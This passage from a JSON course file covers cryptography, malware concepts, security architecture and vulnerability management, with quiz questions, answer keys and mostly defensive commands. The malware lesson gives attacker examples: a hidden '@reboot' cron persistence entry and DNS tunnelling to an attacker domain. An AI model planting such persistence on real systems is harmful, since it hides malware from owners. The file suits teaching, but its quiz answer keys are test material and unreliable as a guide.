        "concept": "Cryptography secures data through mathematical algorithms:\n- **Symmetric Encryption:** Uses a **single shared secret key** for both encryption and decryption (e.g. AES-256, ChaCha20). Fast, computationally efficient, ideal for encrypting large datasets at rest (full disk encryption like BitLocker, LUKS).\n*Challenge:* Key distribution\u2014how do you securely share the key with a remote party over an untrusted network?\n- **Asymmetric Encryption (Public-Key Cryptography):** Uses a mathematically linked **keypair**:\n  - **Public Key:** Shared openly with the world (used to encrypt data or verify signatures)\n  - **Private Key:** Kept strictly secret by the owner (used to decrypt data or generate signatures).\nExamples: RSA, Elliptic Curve Cryptography (ECC / Ed25519). Slower than symmetric encryption; primarily used for key exchange and digital signatures.",
        "whyItMatters": "Hybrid encryption combines both: Asymmetric crypto securely exchanges a symmetric session key, then AES encrypts the bulk data.",
        "examples": [
          "AES-256-GCM: Industry standard authenticated symmetric cipher",
          "RSA-4096: Asymmetric encryption and signing algorithm",
          "Curve25519: High-performance modern elliptic curve algorithm"
        ],
        "commands": [
          {
            "cmd": "echo 'Confidential Data' | openssl enc -aes-256-cbc -a -salt -pbkdf2 -pass pass:MySecretKey",
            "desc": "Encrypt text using symmetric AES-256-CBC and base64 output"
          }
        ],
        "guidedExercise": "Encrypt a sample string using OpenSSL AES-256 and observe the encrypted ciphertext.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-15-1",
            "type": "multiple-choice",
            "question": "In asymmetric public-key cryptography, which key must be kept strictly secret by the owner to decrypt incoming messages?",
            "options": [
              "The Public Key",
              "The Private Key",
              "The Certificate Authority Key",
              "The Symmetric Session Hash"
            ],
            "correctIndex": 1,
            "hint": "The private key is never shared.",
            "explanation": "The private key must never leave the owner's control; it decrypts data encrypted with the public key."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Cryptographic Hashing & Digital Signatures",
        "concept": "A **Cryptographic Hash Function** is a one-way mathematical algorithm that takes input of any size and outputs a fixed-length string (digest). It must satisfy three properties:\n1. **Pre-image Resistance (One-Way):** Given hash $H$, it is computationally infeasible to find original input $M$\n2. **Second Pre-image Resistance:** Given $M_1$, it is infeasible to find $M_2$ where $\\text{Hash}(M_1) = \\text{Hash}(M_2)$\n3. **Collision Resistance:** Infeasible to find *any* two different inputs producing identical hashes. MD5 and SHA-1 are broken due to collision attacks; use SHA-256 or SHA-3.\nA **Digital Signature** is created by hashing a message and encrypting the resulting hash with the sender's *private key*. Anyone with the sender's public key can decrypt the hash and compare it with their own hash calculation, proving authenticity, integrity, and non-repudiation.",
        "whyItMatters": "Software updates and operating system ISOs use digital signatures to prevent supply-chain malware injection.",
        "examples": [
          "MD5: 128-bit (Cryptographically broken, do not use)",
          "SHA-256: 256-bit secure standard digest",
          "Digital Signature = Encrypt(Hash(Message), Sender_Private_Key)"
        ],
        "commands": [
          {
            "cmd": "echo 'Hello' | sha256sum",
            "desc": "Generate SHA-256 digest"
          },
          {
            "cmd": "echo 'hello' | sha256sum",
            "desc": "Notice avalanche effect: a single letter case change alters the entire hash"
          }
        ],
        "guidedExercise": "Observe the avalanche effect by comparing hashes of slightly different strings.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-15-2",
            "type": "exact",
            "question": "Which legacy 128-bit hash function is considered cryptographically broken due to practical collision vulnerabilities?",
            "visualSlots": "_ _ _",
            "acceptedAnswers": [
              "MD5"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Three-letter hash algorithm starting with M.",
            "explanation": "MD5 was demonstrated to have practical hash collision vulnerabilities and must never be used for security."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Public Key Infrastructure (PKI) & TLS 1.3 Review",
        "concept": "Public Key Infrastructure (PKI) binds public keys to identities using digital certificates (X.509) signed by trusted **Certificate Authorities (CAs)**. When your browser visits `https://learning.endlessus.in`, it verifies the CA signature chain. Modern **TLS 1.3** enforces **Perfect Forward Secrecy (PFS)** using Ephemeral Diffie-Hellman (ECDHE), meaning compromise of the server's long-term private key in the future cannot retroactively decrypt recorded past traffic.",
        "whyItMatters": "Forward secrecy guarantees that recorded encrypted communications remain secure forever.",
        "examples": [
          "X.509 Certificate: Contains domain name, public key, validity period, and CA signature",
          "TLS 1.3: Eliminates insecure ciphers and achieves handshake in a single round-trip (1-RTT)"
        ],
        "commands": [
          {
            "cmd": "openssl s_client -connect google.com:443 -servername google.com </dev/null",
            "desc": "Inspect TLS certificate chain, cipher suite, and handshake parameters"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Symmetric vs asymmetric encryption, cryptographic hash properties (collision resistance), digital signatures, and PKI/TLS 1.3.",
          "technicalTakeaways": "Symmetric (AES) is fast and encrypts bulk data; asymmetric (RSA/ECC) securely exchanges keys and generates digital signatures.",
          "commandsCovered": [
            "openssl enc",
            "sha256sum",
            "openssl s_client"
          ],
          "commonMistakes": "Confusing encoding (Base64) with encryption, or assuming hashes can be reversed mathematically.",
          "learningOutcome": "You can select appropriate encryption ciphers, verify digital certificates, and explain the cryptographic foundations of TLS 1.3."
        },
        "questions": [
          {
            "id": "q-15-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Cryptography Fundamentals?",
            "options": [
              "Differentiate Symmetric encryption (AES) from Asymmetric encryption (RSA/ECC)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Differentiate Symmetric encryption (AES) from Asymmetric encryption (RSA/ECC) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-15-1",
        "type": "multiple-choice",
        "question": "In asymmetric public-key cryptography, which key must be kept strictly secret by the owner to decrypt incoming messages?",
        "options": [
          "The Public Key",
          "The Private Key",
          "The Certificate Authority Key",
          "The Symmetric Session Hash"
        ],
        "correctIndex": 1,
        "hint": "The private key is never shared.",
        "explanation": "The private key must never leave the owner's control; it decrypts data encrypted with the public key."
      },
      {
        "id": "q-15-2",
        "type": "exact",
        "question": "Which legacy 128-bit hash function is considered cryptographically broken due to practical collision vulnerabilities?",
        "visualSlots": "_ _ _",
        "acceptedAnswers": [
          "MD5"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Three-letter hash algorithm starting with M.",
        "explanation": "MD5 was demonstrated to have practical hash collision vulnerabilities and must never be used for security."
      },
      {
        "id": "q-15-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Cryptography Fundamentals?",
        "options": [
          "Differentiate Symmetric encryption (AES) from Asymmetric encryption (RSA/ECC)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Differentiate Symmetric encryption (AES) from Asymmetric encryption (RSA/ECC) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Symmetric vs Asymmetric Encryption",
        "instruction": "Encrypt a sample string using OpenSSL AES-256 and observe the encrypted ciphertext.",
        "hints": [
          "The private key is never shared."
        ]
      },
      {
        "title": "Task 2: Cryptographic Hashing & Digital Signatures",
        "instruction": "Observe the avalanche effect by comparing hashes of slightly different strings.",
        "hints": [
          "Three-letter hash algorithm starting with M."
        ]
      },
      {
        "title": "Task 3: Public Key Infrastructure (PKI) & TLS 1.3 Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-16"
  },
  {
    "id": "room-16",
    "stageId": "cyber-security",
    "stageTitle": "Cyber Security Foundations",
    "stageOrder": 2,
    "stage": 2,
    "level": 2,
    "levelTitle": "Cyber Security Foundations",
    "roomNumber": 16,
    "title": "Malware and Attack Concepts",
    "description": "Deconstruct malicious software: viruses, worms, trojans, ransomware, rootkits, command & control (C2), and the adversary attack lifecycle.",
    "difficulty": "Foundational",
    "difficultyBadge": "Foundational",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-15",
    "whyAreYouHere": "Deconstruct malicious software: viruses, worms, trojans, ransomware, rootkits, command & control (C2), and the adversary attack lifecycle.",
    "objectives": [
      "Classify malware types: viruses, worms, trojans, ransomware, and rootkits",
      "Analyze Command and Control (C2) architectures and beaconing",
      "Understand the Cyber Kill Chain and MITRE ATT&CK framework",
      "Identify persistence and evasion techniques used by modern malware"
    ],
    "skillsGained": [
      "Malware Classification",
      "C2 Infrastructure",
      "Ransomware Operations",
      "MITRE ATT&CK"
    ],
    "toolsAndCommands": [
      "ps aux",
      "crontab -l",
      "ss -tulpn",
      "file"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Malware Taxonomy: From Viruses to Ransomware",
        "concept": "Malicious software (Malware) is classified by its replication mechanism and primary objective:\n- **Virus:** Code that attaches to a legitimate host executable and replicates when the host program is executed by a user\n- **Worm:** Standalone self-replicating malware that spreads across computer networks automatically by exploiting network service vulnerabilities without human interaction (e.g. WannaCry, Conficker)\n- **Trojan Horse:** Malware disguised as legitimate, desirable software (e.g. cracked game or invoice PDF) that tricks users into executing it\n- **Ransomware:** Encrypts user files using strong symmetric ciphers (AES) and demands cryptocurrency extortion for the asymmetric decryption key\n- **Spyware / Keylogger:** Secretly records keystrokes, screenshots, and credentials, exfiltrating data to an adversary server\n- **Rootkit:** Operates at the kernel or hypervisor level, intercepting operating system system calls to conceal its presence, processes, and network sockets from antivirus tools.",
        "whyItMatters": "Kernel rootkits modify the operating system syscall table to hide their own files from `ls` and `ps`.",
        "examples": [
          "WannaCry: Worm using EternalBlue (MS17-010) exploit to propagate and deliver ransomware",
          "Stuxnet: Highly sophisticated multi-zero-day worm targeting industrial SCADA PLCs"
        ],
        "commands": [
          {
            "cmd": "file /bin/ls",
            "desc": "Determine file architecture and ELF binary properties"
          }
        ],
        "guidedExercise": "Inspect how file identification tools detect executable binaries regardless of file extension.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-16-1",
            "type": "exact",
            "question": "What type of malware self-replicates across networks automatically without requiring user interaction?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "worm",
              "worms"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Four-letter word, named after an organism that burrows.",
            "explanation": "A worm is standalone, self-propagating malware that spreads automatically over networks."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Command and Control (C2) & Persistence",
        "concept": "Once malware executes, it typically establishes **Persistence** so it survives system reboots (via Windows Registry Run keys, Linux systemd services, or cron jobs). Next, it connects outbound to an adversary-controlled server called a **Command and Control (C2 / C&C) server**. To blend into legitimate enterprise network traffic, modern C2 agents (like Mythic or Cobalt Strike) use periodic **Beaconing** over encrypted HTTPS or DNS tunneling, making sporadic requests with randomized jitter to evade automated threshold detection.",
        "whyItMatters": "Detecting regular periodic beaconing patterns in web proxy logs is a core threat hunting technique.",
        "examples": [
          "Persistence: Adding a scheduled cron job: `@reboot /tmp/.agent`",
          "Beaconing: Sending an HTTPS GET request every 60 seconds +/- 20% random jitter",
          "DNS Tunneling: Encoding stolen data into subdomain queries like `data.attacker.com`"
        ],
        "commands": [
          {
            "cmd": "crontab -l",
            "desc": "List scheduled user cron jobs to inspect potential persistence entries"
          },
          {
            "cmd": "systemctl list-unit-files --type=service --state=enabled",
            "desc": "Enumerate auto-starting system services"
          }
        ],
        "guidedExercise": "Audit scheduled cron jobs to detect unauthorized persistence mechanisms.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-16-2",
            "type": "multiple-choice",
            "question": "What term describes the periodic outbound communication signal malware sends to its command server to request instructions?",
            "options": [
              "Flooding",
              "Beaconing",
              "Port Scanning",
              "Subnetting"
            ],
            "correctIndex": 1,
            "hint": "Like a lighthouse sending regular signals.",
            "explanation": "Beaconing is the regular heartbeat communication sent by malware agents to their C2 server."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Adversary Lifecycles & Final Knowledge Review",
        "concept": "Security teams map adversary operations using two models:\n1. **Lockheed Martin Cyber Kill Chain:** Reconnaissance -> Weaponization -> Delivery -> Exploitation -> Installation -> Command & Control -> Actions on Objectives\n2. **MITRE ATT&CK Framework:** A comprehensive matrix of real-world adversary Tactics (goals), Techniques (how they achieve goals), and Procedures (TTPs).",
        "whyItMatters": "Breaking any single phase of the Cyber Kill Chain completely neutralizes the attack.",
        "examples": [
          "Initial Access -> Execution -> Persistence -> Privilege Escalation -> Defense Evasion -> Credential Access -> Lateral Movement -> Exfiltration"
        ],
        "commands": [
          {
            "cmd": "ps -ef",
            "desc": "Audit running processes for anomalous binaries"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Malware classification (worms, trojans, ransomware, rootkits), C2 beaconing architectures, and the Cyber Kill Chain/MITRE ATT&CK.",
          "technicalTakeaways": "Worms propagate without user action; rootkits modify kernel syscalls to hide. Breaking any link in the Cyber Kill Chain stops the attack.",
          "commandsCovered": [
            "crontab -l",
            "ps aux",
            "file"
          ],
          "commonMistakes": "Thinking viruses and worms are identical, or assuming all malware communicates continuously without jitter.",
          "learningOutcome": "You can classify malware types, trace C2 beaconing behaviors, and map adversary actions using MITRE ATT&CK."
        },
        "questions": [
          {
            "id": "q-16-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Malware and Attack Concepts?",
            "options": [
              "Classify malware types: viruses, worms, trojans, ransomware, and rootkits",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Classify malware types: viruses, worms, trojans, ransomware, and rootkits is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-16-1",
        "type": "exact",
        "question": "What type of malware self-replicates across networks automatically without requiring user interaction?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "worm",
          "worms"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Four-letter word, named after an organism that burrows.",
        "explanation": "A worm is standalone, self-propagating malware that spreads automatically over networks."
      },
      {
        "id": "q-16-2",
        "type": "multiple-choice",
        "question": "What term describes the periodic outbound communication signal malware sends to its command server to request instructions?",
        "options": [
          "Flooding",
          "Beaconing",
          "Port Scanning",
          "Subnetting"
        ],
        "correctIndex": 1,
        "hint": "Like a lighthouse sending regular signals.",
        "explanation": "Beaconing is the regular heartbeat communication sent by malware agents to their C2 server."
      },
      {
        "id": "q-16-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Malware and Attack Concepts?",
        "options": [
          "Classify malware types: viruses, worms, trojans, ransomware, and rootkits",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Classify malware types: viruses, worms, trojans, ransomware, and rootkits is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Malware Taxonomy: From Viruses to Ransomware",
        "instruction": "Inspect how file identification tools detect executable binaries regardless of file extension.",
        "hints": [
          "Four-letter word, named after an organism that burrows."
        ]
      },
      {
        "title": "Task 2: Command and Control (C2) & Persistence",
        "instruction": "Audit scheduled cron jobs to detect unauthorized persistence mechanisms.",
        "hints": [
          "Like a lighthouse sending regular signals."
        ]
      },
      {
        "title": "Task 3: Adversary Lifecycles & Final Knowledge Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-17"
  },
  {
    "id": "room-17",
    "stageId": "cyber-security",
    "stageTitle": "Cyber Security Foundations",
    "stageOrder": 2,
    "stage": 2,
    "level": 2,
    "levelTitle": "Cyber Security Foundations",
    "roomNumber": 17,
    "title": "Security Architecture",
    "description": "Design enterprise defensive architectures: Next-Gen Firewalls, Demilitarized Zones (DMZ), network micro-segmentation, and Zero Trust.",
    "difficulty": "Foundational",
    "difficultyBadge": "Foundational",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-16",
    "whyAreYouHere": "Design enterprise defensive architectures: Next-Gen Firewalls, Demilitarized Zones (DMZ), network micro-segmentation, and Zero Trust.",
    "objectives": [
      "Contrast legacy perimeter security (castle-and-moat) with Zero Trust Architecture",
      "Design Demilitarized Zones (DMZ) for public-facing servers",
      "Implement network micro-segmentation and VLAN isolation",
      "Analyze Next-Generation Firewalls (NGFW) and Deep Packet Inspection (DPI)"
    ],
    "skillsGained": [
      "Zero Trust Architecture",
      "DMZ Design",
      "Network Segmentation",
      "Next-Gen Firewalls"
    ],
    "toolsAndCommands": [
      "iptables -L",
      "nft list ruleset",
      "ip route",
      "tcpdump -i any"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Castle-and-Moat vs Zero Trust Architecture",
        "concept": "Traditional network security relied on the **Castle-and-Moat** perimeter model: everything outside the firewall is untrusted, but everything inside the corporate intranet is implicitly trusted. Once an adversary breached the perimeter (via a phishing email or VPN compromise), they enjoyed unrestricted lateral movement across internal subnets.\n**Zero Trust Architecture (ZTA)**, defined by NIST SP 800-207, eliminates implicit trust. Its core mantra is **\"Never Trust, Always Verify\"**:\n- **Verify Explicitly:** Authenticate and authorize every request based on identity, device health, and context\n- **Use Least Privilege Access:** Grant just-in-time and just-enough access (JIT/JEA)\n- **Assume Breach:** Minimize blast radius by micro-segmenting networks and encrypting all internal east-west traffic.",
        "whyItMatters": "Zero Trust assumes the adversary already has a presence on the internal network.",
        "examples": [
          "Castle-and-Moat: Compromising a printer allows access to the financial database",
          "Zero Trust: Even inside the office LAN, accessing the database requires mTLS, MFA, and device compliance checks"
        ],
        "commands": [
          {
            "cmd": "sudo iptables -L -v -n",
            "desc": "Display host firewall packet counters and rules"
          }
        ],
        "guidedExercise": "Inspect how host-based firewall rules enforce zero trust boundaries at the individual machine level.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-17-1",
            "type": "exact",
            "question": "What is the core architectural philosophy and guiding mantra of Zero Trust security?",
            "visualSlots": "_ _ _ _ _   _ _ _ _ _ ,   _ _ _ _ _ _   _ _ _ _ _ _",
            "acceptedAnswers": [
              "Never Trust, Always Verify",
              "Never trust always verify"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Four words: Never ... Always ...",
            "explanation": "Zero Trust eliminates implicit trust with the mantra: 'Never Trust, Always Verify'."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Demilitarized Zones (DMZ) & Micro-Segmentation",
        "concept": "A **Demilitarized Zone (DMZ)** is a physical or logical subnet that isolates public-facing services (web servers, mail relays, DNS) from an organization's private internal network. If an external attacker compromises a web server in the DMZ, firewall rules prevent the compromised server from initiating connections into the sensitive internal LAN.\n**Micro-segmentation** extends this by using software-defined networking (VLANs, host firewalls) to isolate workloads from one another even within the same datacenter (preventing lateral movement).",
        "whyItMatters": "Without DMZ isolation, compromising a public web app exposes the entire internal domain controller.",
        "examples": [
          "Internet -> External Firewall -> DMZ (Web Server) -> Internal Firewall -> Corporate LAN (Databases)",
          "East-West Traffic: Traffic moving laterally between internal servers",
          "North-South Traffic: Traffic moving between internet and internal servers"
        ],
        "commands": [
          {
            "cmd": "ip route show",
            "desc": "Display local routing interfaces and subnet boundaries"
          }
        ],
        "guidedExercise": "Review network topology maps and identify the firewall barriers between DMZ and internal databases.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-17-2",
            "type": "multiple-choice",
            "question": "What is the primary security objective of placing internet-facing web servers in a Demilitarized Zone (DMZ)?",
            "options": [
              "To boost website download speeds for users",
              "To prevent a compromised web server from initiating direct unauthorized connections into the private internal corporate network",
              "To bypass all firewall inspection rules",
              "To eliminate the need for HTTPS encryption"
            ],
            "correctIndex": 1,
            "hint": "Contains the blast radius of a public server breach.",
            "explanation": "A DMZ acts as a buffer zone, preventing compromised external servers from reaching private internal networks."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Firewall Generations & Architecture Review",
        "concept": "Firewalls have evolved across generations:\n- **Packet Filtering (Stateless):** Inspects individual packet headers (IP, Port) without connection awareness\n- **Stateful Inspection:** Tracks TCP connection states (ESTABLISHED, NEW), blocking unsolicited incoming packets\n- **Next-Generation Firewall (NGFW):** Operates up to Layer 7 (Application Layer), performing Deep Packet Inspection (DPI) to identify applications (e.g. distinguishing BitTorrent from HTTPS on port 443) and integrated IPS.",
        "whyItMatters": "NGFWs inspect application layer payloads to detect malicious traffic hiding on standard ports.",
        "examples": [
          "Layer 7 Inspection: Detecting command-and-control HTTP traffic on port 443"
        ],
        "commands": [
          {
            "cmd": "sudo nft list ruleset",
            "desc": "Display modern Linux nftables security packet rules"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Castle-and-moat vs Zero Trust Architecture ('Never Trust, Always Verify'), DMZ network design, micro-segmentation, and NGFW Deep Packet Inspection.",
          "technicalTakeaways": "Perimeter defenses are insufficient; internal micro-segmentation and DMZ isolation prevent lateral adversary movement.",
          "commandsCovered": [
            "iptables -L",
            "nft list ruleset",
            "ip route"
          ],
          "commonMistakes": "Assuming internal networks are safe, or believing a DMZ allows unrestricted traffic into the internal database.",
          "learningOutcome": "You can design a secure network architecture featuring DMZ isolation, micro-segmentation, and Zero Trust verification."
        },
        "questions": [
          {
            "id": "q-17-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Security Architecture?",
            "options": [
              "Contrast legacy perimeter security (castle-and-moat) with Zero Trust Architecture",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Contrast legacy perimeter security (castle-and-moat) with Zero Trust Architecture is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-17-1",
        "type": "exact",
        "question": "What is the core architectural philosophy and guiding mantra of Zero Trust security?",
        "visualSlots": "_ _ _ _ _   _ _ _ _ _ ,   _ _ _ _ _ _   _ _ _ _ _ _",
        "acceptedAnswers": [
          "Never Trust, Always Verify",
          "Never trust always verify"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Four words: Never ... Always ...",
        "explanation": "Zero Trust eliminates implicit trust with the mantra: 'Never Trust, Always Verify'."
      },
      {
        "id": "q-17-2",
        "type": "multiple-choice",
        "question": "What is the primary security objective of placing internet-facing web servers in a Demilitarized Zone (DMZ)?",
        "options": [
          "To boost website download speeds for users",
          "To prevent a compromised web server from initiating direct unauthorized connections into the private internal corporate network",
          "To bypass all firewall inspection rules",
          "To eliminate the need for HTTPS encryption"
        ],
        "correctIndex": 1,
        "hint": "Contains the blast radius of a public server breach.",
        "explanation": "A DMZ acts as a buffer zone, preventing compromised external servers from reaching private internal networks."
      },
      {
        "id": "q-17-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Security Architecture?",
        "options": [
          "Contrast legacy perimeter security (castle-and-moat) with Zero Trust Architecture",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Contrast legacy perimeter security (castle-and-moat) with Zero Trust Architecture is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Castle-and-Moat vs Zero Trust Architecture",
        "instruction": "Inspect how host-based firewall rules enforce zero trust boundaries at the individual machine level.",
        "hints": [
          "Four words: Never ... Always ..."
        ]
      },
      {
        "title": "Task 2: Demilitarized Zones (DMZ) & Micro-Segmentation",
        "instruction": "Review network topology maps and identify the firewall barriers between DMZ and internal databases.",
        "hints": [
          "Contains the blast radius of a public server breach."
        ]
      },
      {
        "title": "Task 3: Firewall Generations & Architecture Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-18"
  },
  {
    "id": "room-18",
    "stageId": "cyber-security",
    "stageTitle": "Cyber Security Foundations",
    "stageOrder": 2,
    "stage": 2,
    "level": 2,
    "levelTitle": "Cyber Security Foundations",
    "roomNumber": 18,
    "title": "Vulnerability Management",
    "description": "Master the vulnerability management lifecycle: asset discovery, automated vulnerability scanning, vulnerability triage, and patch verification.",
    "difficulty": "Foundational",
    "difficultyBadge": "Foundational",
    "estimatedTime": "30 mins",
    "xpReward": 50,
    "prerequisites": "room-17",
    "whyAreYouHere": "Master the vulnerability management lifecycle: asset discovery, automated vulnerability scanning, vulnerability triage, and patch verification.",
    "objectives": [
      "Explain the continuous vulnerability management lifecycle",
      "Differentiate vulnerability scanning from penetration testing",
      "Prioritize vulnerabilities using CVSS and Exploit Prediction Scoring (EPSS)",
      "Implement remediation verification and patch testing cycles"
    ],
    "skillsGained": [
      "Vuln Management Lifecycle",
      "Scanning vs Pentesting",
      "EPSS Prioritization",
      "Patch Management"
    ],
    "toolsAndCommands": [
      "nmap --script vuln",
      "apt list --upgradable",
      "dpkg -l"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The Vulnerability Management Lifecycle",
        "concept": "Vulnerabilities are discovered constantly (over 25,000 new CVEs published annually). **Vulnerability Management** is the continuous, cyclical process of identifying, evaluating, treating, and reporting security vulnerabilities across systems and applications. The lifecycle consists of five stages:\n1. **Discovery & Inventory:** Continuously discover and catalog all hardware, software, and cloud assets\n2. **Assessment (Scanning):** Run automated vulnerability scanners (e.g. Nessus, OpenVAS, Qualys) to detect known CVE flaws and misconfigurations\n3. **Prioritization:** Prioritize patches based on risk context (Is the asset internet-facing? Is there active exploit code in the wild?)\n4. **Remediation / Mitigation:** Apply vendor software patches, deploy firewall workarounds, or alter configurations\n5. **Verification:** Rescan the asset to confirm the patch successfully resolved the flaw without breaking application functionality.",
        "whyItMatters": "Unpatched known vulnerabilities with public exploit code are the primary entry point for automated ransomware gangs.",
        "examples": [
          "Automated scanning: Fast, broad coverage of thousands of hosts",
          "Penetration testing: In-depth manual human exploitation to test real-world impact"
        ],
        "commands": [
          {
            "cmd": "apt list --upgradable",
            "desc": "List packages with available security updates on Debian/Ubuntu systems"
          }
        ],
        "guidedExercise": "Check for pending security updates on your system.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-18-1",
            "type": "multiple-choice",
            "question": "What is the primary difference between automated vulnerability scanning and manual penetration testing?",
            "options": [
              "Vulnerability scanning is illegal, while penetration testing is legal",
              "Vulnerability scanning identifies potential known flaws automatically without active exploitation, while penetration testing actively exploits vulnerabilities to demonstrate real-world impact",
              "Vulnerability scanning only checks hardware cables",
              "Penetration testing can only be performed by government agencies"
            ],
            "correctIndex": 1,
            "hint": "Scanning finds potential flaws; pentesting verifies real-world exploitability.",
            "explanation": "Scanning broadly identifies potential vulnerabilities; penetration testing manually validates and chains vulnerabilities to prove impact."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Prioritization: CVSS vs EPSS",
        "concept": "Security teams cannot patch every vulnerability instantly. To prioritize efficiently, analysts combine two metrics:\n- **CVSS (Common Vulnerability Scoring System):** Measures the *technical severity* of a vulnerability (0.0\u201310.0) based on inherent qualities\n- **EPSS (Exploit Prediction Scoring System):** Estimates the *probability (0\u2013100%)* that a software vulnerability will be exploited in the wild within the next 30 days.\nA vulnerability with a CVSS of 7.5 that has an EPSS of 90% (active exploit code in the wild) must be patched before an internal CVSS 9.8 flaw with an EPSS of 0.1%.",
        "whyItMatters": "EPSS helps security teams focus limited patching resources on the 3% of vulnerabilities adversaries actually exploit.",
        "examples": [
          "CISA KEV: Catalog of Known Exploited Vulnerabilities requiring mandatory federal remediation timelines",
          "Zero-Day Vulnerability: A flaw actively exploited before the vendor has issued a security patch"
        ],
        "commands": [
          {
            "cmd": "dpkg -l | grep -i openssl",
            "desc": "Check currently installed version of OpenSSL to cross-reference CVEs"
          }
        ],
        "guidedExercise": "Inspect installed software versions to compare against vulnerability databases.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-18-2",
            "type": "exact",
            "question": "What data-driven scoring system calculates the probability (percentage) that a vulnerability will be exploited in the wild within 30 days?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "EPSS",
              "Exploit Prediction Scoring System"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Four-letter acronym starting with E.",
            "explanation": "EPSS (Exploit Prediction Scoring System) models real-world exploit probability to prioritize patching."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Remediation Verification & Final Review",
        "concept": "Never assume a patch succeeded without independent verification. Automated deployment scripts can fail, configuration files may be locked, or services may require a reboot to load updated shared libraries.",
        "whyItMatters": "Always perform a post-patch verification scan to confirm closure of the vulnerability.",
        "examples": [
          "Patch Verification: Run vulnerability scanner after maintenance window to verify CVE resolution"
        ],
        "commands": [
          {
            "cmd": "sudo needrestart",
            "desc": "Check which system processes require restarting after library updates"
          }
        ],
